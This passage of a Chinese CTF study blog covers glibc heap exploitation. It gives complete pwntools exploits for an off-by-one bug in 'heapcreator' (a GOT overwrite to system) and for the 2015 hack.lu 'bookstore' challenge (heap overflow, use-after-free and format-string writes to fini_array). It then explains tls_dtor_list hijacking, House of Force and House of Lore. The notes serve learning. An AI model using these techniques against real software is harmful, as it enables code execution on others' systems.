class="keyword">struct</span> &#123;</span> </span><br><span class="line"><span class="type">int</span> size; </span><br><span class="line"><span class="class"><span class="keyword">struct</span> * <span class="title">content</span>;</span></span><br><span class="line">&#125; heap;</span><br></pre></td></tr></table></figure><p>edit_heap</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( heaparray[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(heaparray[v1]-&gt;content, heaparray[v1]-&gt;size + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能看到这里的多读了一个字节，就可以篡改其size值</p><p>思路：</p><ol><li>利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。</li><li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">heap = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span> </span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">&quot;dada&quot;</span>)  <span class="comment"># 0 得到0x20大小的chunk</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&quot;ddaa&quot;</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># overwrite heap 1&#x27;s struct&#x27;s size to 0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + <span class="string">&quot;\x41&quot;</span>)</span><br><span class="line"><span class="comment"># trigger heap 1&#x27;s struct to fastbin 0x40</span></span><br><span class="line"><span class="comment"># heap 1&#x27;s content to fastbin 0x20</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># new heap 1&#x27;s struct will point to old heap 1&#x27;s content, size 0x20</span></span><br><span class="line"><span class="comment"># new heap 1&#x27;s content will point to old heap 1&#x27;s struct, size 0x30</span></span><br><span class="line"><span class="comment"># that is to say we can overwrite new heap 1&#x27;s struct</span></span><br><span class="line"><span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">&#x27;free&#x27;</span>]))  <span class="comment">#1</span></span><br><span class="line"><span class="comment"># leak freeaddr</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"><span class="comment"># trigger system(&quot;/bin/sh&quot;)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h5 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h5><p>首先checksec</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/gery5sa/桌面/pwn/test/heap/extend/2015_hacklu_bookstore/books&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>该程序的主要功能是订书，具体如下</p><ul><li><p>最多可以订购两本书。</p></li><li><p>根据编号来选择订购第几本书，可以为每本书添加对应的名字。然而在添加名字处出现了任意长度堆溢出的漏洞。</p><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241017103907330.png" alt="image-20241017103907330"></p></li><li><p>根据编号来删除 order，但是这里只是单纯地 free 掉，并没有置为 NULL，因此会出现 use after free 的漏洞。</p><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241017103926463.png" alt="image-20241017103926463"></p></li><li><p>提交订单，将两本书的名字合在一起。这里由于上面堆溢出的问题，这里也会出现堆溢出的漏洞。</p></li><li><p>此外，在程序退出之前存在一个<strong>格式化字符串漏洞</strong>。</p><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241017104000056.png" alt="image-20241017104000056"></p></li></ul><p>这里虽然程序的漏洞能力很强，但是所有进行 malloc 的大小都是完全固定的，我们只能借助这些分配的 chunk 来进行操作。</p><p>利用思路</p><ol><li><p>想直接利用edit(2)，来覆盖dest的值，达到格式化字符串漏洞，但是每次edit之后，dest都被覆盖</p><p><img src="https://gitee.com/gery5sa/images/raw/master/image-20241017104223150.png" alt="image-20241017104223150"></p></li><li><p>我们可以edit(1)，覆盖到second，构造一个0x150大小的bin，这样在submit时，可以malloc出的chunk，覆盖dest内存，再将构造好的payload写入到dest中，利用到格式化字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602000:    0x0000000000000000    0x0000000000000091 &lt;--堆块一头</span><br><span class="line">0x602010:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602020:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602030:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602040:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602050:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602060:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602070:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602080:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602090:    0x0000000000000000    0x0000000000000091 &lt;--新申请的0x140堆块头</span><br><span class="line">0x6020a0:    0x00007ffff7dd1b78    0x00007ffff7dd1b78</span><br><span class="line">0x6020b0:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x6020c0:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x6020d0:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x6020e0:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x6020f0:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602100:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602110:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602120:    0x0000000000000090    0x0000000000000090 &lt;--dest堆块头(printf处)</span><br><span class="line">0x602130:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602140:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602150:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602160:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602170:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602180:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x602190:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x6021a0:    0x0000000000000000    0x0000000000000000</span><br><span class="line">0x6021b0:    0x0000000000000000    0x0000000000000411</span><br></pre></td></tr></table></figure><p>当进行复制时</p><p>第一次复制：firest_chunk被复制到second_chunk处</p><p>第二次复制：second_chunk处已经被覆盖，所以仍然是dest处被覆盖的first_chunk</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order1:chunk1</span><br><span class="line">order2:chunk1</span><br><span class="line">dest:chunk1</span><br></pre></td></tr></table></figure><p>ge</p></li></ol><p>给出的exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :io.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(io.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">duan</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">x64_32 = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> x64_32:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./books&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">order,context</span>):</span><br><span class="line">    ru(<span class="string">&quot;5: Submit&quot;</span>)</span><br><span class="line">    sl(order)</span><br><span class="line">    ru(<span class="string">&quot;order:&quot;</span>)</span><br><span class="line">    io.sendline(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">order</span>):</span><br><span class="line">    ru(<span class="string">&quot;5: Submit&quot;</span>)</span><br><span class="line">    sl(order+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">context</span>):</span><br><span class="line">    ru(<span class="string">&quot;5: Submit&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span>+context)</span><br><span class="line">fini_arry0=<span class="number">0x6011b8</span>  </span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xa39</span>).encode() + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%13$hn&#x27;</span> + <span class="string">b&#x27;-%31$p&#x27;</span> + <span class="string">b&#x27;-%26$p&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x74</span>,<span class="string">b&quot;f&quot;</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x140</span></span><br><span class="line">payload += p64(<span class="number">0x150</span>)</span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line"><span class="comment">#payload += p64</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#duan()</span></span><br><span class="line">submit(<span class="string">b&#x27;aaaaaaa&#x27;</span>+p64(fini_arry0)) <span class="comment">#将该地址输入到栈中，%13$p定位到该位置</span></span><br><span class="line">ru(<span class="string">&#x27;Order 2: &#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;Order 2: &quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_start_main = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;libc_start_main&quot;</span>,libc_start_main)</span><br><span class="line">ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">ret_b = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main = libc_start_main - <span class="number">240</span></span><br><span class="line">base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0x45226</span> <span class="comment"># 0x4527a 0xf03a4 0xf1247</span></span><br><span class="line"></span><br><span class="line">ret_addr = ret_b - <span class="number">1209</span>  + <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">leak(<span class="string">&quot;ret_addr&quot;</span>,ret_addr)</span><br><span class="line">sh = base + one_gadget</span><br><span class="line">leak(<span class="string">&quot;sh&quot;</span>,sh)</span><br><span class="line"></span><br><span class="line">sh = sh&amp;<span class="number">0xffffff</span></span><br><span class="line">ch0 =sh&amp;<span class="number">0xff</span></span><br><span class="line">ch1 =(sh&gt;&gt;<span class="number">8</span>) - ch0</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ch0).encode() + <span class="string">b&#x27;c%13$hhn&#x27;</span></span><br><span class="line">payload+= <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ch1).encode() + <span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x74</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x90</span>)</span><br><span class="line">payload+=p64(<span class="number">0x151</span>)</span><br><span class="line">payload+= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x140</span></span><br><span class="line">payload+= p64(<span class="number">0x150</span>)</span><br><span class="line">payload+= p64(<span class="number">0x21</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">duan()</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">submit(<span class="string">b&#x27;aaaaaaa&#x27;</span>+p64(ret_addr)+p64(ret_addr+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里，各个参数的偏移是</p><ul><li>Fini_array0 : 5+8&#x3D;13</li><li>__libc_start_main_ret : 5+0x1a&#x3D;31。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp  0x7ffe6a7f3ec8 —▸ 0x400c93 ◂— mov    eax, 0</span><br><span class="line">01:0008│      0x7ffe6a7f3ed0 ◂— 0x100000000</span><br><span class="line">02:0010│      0x7ffe6a7f3ed8 —▸ 0x9f20a0 ◂— 0x3a3120726564724f (&#x27;Order 1:&#x27;)</span><br><span class="line">03:0018│      0x7ffe6a7f3ee0 —▸ 0x400d38 ◂— pop    rcx</span><br><span class="line">04:0020│      0x7ffe6a7f3ee8 —▸ 0x9f2010 ◂— 0x6666666666667325 (&#x27;%sffffff&#x27;)</span><br><span class="line">05:0028│      0x7ffe6a7f3ef0 —▸ 0x9f20a0 ◂— 0x3a3120726564724f (&#x27;Order 1:&#x27;)</span><br><span class="line">06:0030│      0x7ffe6a7f3ef8 —▸ 0x9f2130 ◂— 0x6564724f203a3220 (&#x27; 2: Orde&#x27;)</span><br><span class="line">07:0038│      0x7ffe6a7f3f00 ◂— 0xa35 /* &#x27;5\n&#x27; */</span><br><span class="line">08:0040│      0x7ffe6a7f3f08 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0b:0058│      0x7ffe6a7f3f20 ◂— 0xff00000000000000</span><br><span class="line">0c:0060│      0x7ffe6a7f3f28 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0f:0078│      0x7ffe6a7f3f40 ◂— 0x5f5f00656d697474 /* &#x27;ttime&#x27; */</span><br><span class="line">10:0080│      0x7ffe6a7f3f48 ◂— 0x7465675f6f736476 (&#x27;vdso_get&#x27;)</span><br><span class="line">11:0088│      0x7ffe6a7f3f50 ◂— 0x1</span><br><span class="line">12:0090│      0x7ffe6a7f3f58 —▸ 0x400cfd ◂— add    rbx, 1</span><br><span class="line">13:0098│      0x7ffe6a7f3f60 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">15:00a8│      0x7ffe6a7f3f70 —▸ 0x400cb0 ◂— push   r15</span><br><span class="line">16:00b0│      0x7ffe6a7f3f78 —▸ 0x400780 ◂— xor    ebp, ebp</span><br><span class="line">17:00b8│      0x7ffe6a7f3f80 —▸ 0x7ffe6a7f4070 ◂— 0x1</span><br><span class="line">18:00c0│      0x7ffe6a7f3f88 ◂— 0xd8d379f22453ff00</span><br><span class="line">19:00c8│ rbp  0x7ffe6a7f3f90 —▸ 0x400cb0 ◂— push   r15</span><br><span class="line">1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure><h4 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit_hook"></a>exit_hook</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>就是调用<code>exit</code>函数的时候，会调用其中的函数，寻找一下具体原理</p><h4 id="劫持glibc2-35的tls-dtor-list实现流程控制"><a href="#劫持glibc2-35的tls-dtor-list实现流程控制" class="headerlink" title="劫持glibc2.35的tls_dtor_list实现流程控制"></a>劫持<code>glibc2.35</code>的<code>tls_dtor_list</code>实现流程控制</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>任意地址写</li><li>堆地址泄露</li><li>exit退出</li></ul><h5 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit</span><br><span class="line">---&gt;    </span><br><span class="line">__run_exit_handlers</span><br><span class="line">---&gt;</span><br><span class="line">__call_tls_dtors</span><br></pre></td></tr></table></figure><p><code>__call_tls_dtors</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__call_tls_dtors (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (tls_dtor_list) <span class="comment">//判断tis_dtor_list是否为空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list; <span class="comment">//将tls_dtor_list链表赋给dtor_list结构体</span></span><br><span class="line">      dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">      tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">      func (cur-&gt;obj);<span class="comment">//调用成员变量func,参数也是其成员变量</span></span><br><span class="line">      atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">      <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//dtor_list结构体原型</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  dtor_func func; <span class="comment">// 8字节</span></span><br><span class="line">  <span class="type">void</span> *obj;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们劫持得了<code>tls_dtor_list</code>链表，就可以进入循环并控制<code>dtor_list</code>结构体<strong>cur</strong>，从而控制其成员变量<code>func</code>与<code>obj</code>，然后实现任意函数执行，并且第一个参数可控！</p><p>然而这里需要注意的是 <code>PTR_DEMANGLE (func)</code> 会将<code>func</code>解密，如下是 <code>PTR_DEMANGLE</code> 宏定义</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(reg)ror $2*LP_SIZE+1, reg;      \</span></span><br><span class="line"><span class="meta">xor %fs:POINTER_GUARD, reg</span></span><br></pre></td></tr></table></figure><p>正常情况解密过程是先将reg循环右移0x11位，然后再将reg与pointer_guard进行异或得到最终的结果。</p><p>所以这里加密的过程也就很清晰了，只需要将我们真实地址先与pointer_guard进行异或，然后再循环左移0x11位即可。这也就是为什么我们需要泄露pointer_guard的原因。</p><h4 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h4><p>原理：</p><p><code>House Of Force</code>是一种堆溢出的利用方法，当然能够通过<code>House Of Force</code>进行利用的可能不只是堆溢出漏洞。如果一个堆<code>(heap based)</code>漏洞想要通过<code>House Of Force</code>方法进行利用，需要以下条件：</p><p><code>House Of Force</code>产生的原因在于<code>glibc</code>对<code>top chunk</code>的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时会从<code>top chunk</code>中分割出相应的大小作为堆块的空间，因此<code>top chunk</code>的位置会发生上下浮动以适应堆内存分配和释放。</p><p><code>HOF</code>的利用思想可以概括为一句话：<br>当使用<code>top chunk</code>分配堆块的size值是由用户控制的任意值时会发生什么？<br>答案是，可以使得<code>top chunk</code>移动到我们想要达到的任何位置，这就相当于一次任意地址写。<br>然而在<code>glibc</code>中，会对用户请求的大小和<code>top chunk</code>现有的<code>size</code>进行验证</p><p>然而，如果可以篡改<code>size</code>的大小为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制<code>top chunk size</code>域的漏洞。</p><p>一般的做法是把<code>top chunk</code>的<code>size</code>改为<code>-1</code>，因为在进行比较时会把size转换成无符号数(如上)，因此-1会解释成为一个大数，就可以使得所有64位值都能通过验证。</p><p>之后这里会把<code>top</code>指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意址<code>(write-anything-anywhere)</code>。</p><h4 id="house-of-Lore"><a href="#house-of-Lore" class="headerlink" title="house_of_Lore"></a>house_of_Lore</h4><p>2.23-2.31(不包含2.31)</p><p><strong>libc-2.23</strong></p><p><strong>libc-2.27</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></table></figure><p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p><p><strong>libc-2.31</strong>（House Of Lore 被ban）</p><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</p><h5 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h5><p>house of lore是通过small bin机制，去进行任意地址的chunk 分配</p><h5 id="源码解释"><a href="#源码解释" class="headerlink" title="源码解释"></a>源码解释</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (in_smallbin_range (nb))  //检查请求的内存块大小nb是否在small_bin的范围内</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);  //根据请求的内存块大小nb，计算并获取对应的small_bin的索引idx。</span><br><span class="line">      bin = bin_at (av, idx); //使用索引idx拿到对应的small_bin</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)//如果非空，选择small_bin的最后一个块作为分配的块</span><br><span class="line">        &#123;</span><br><span class="line">          if (victim == 0) //</span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          else</span><br><span class="line">            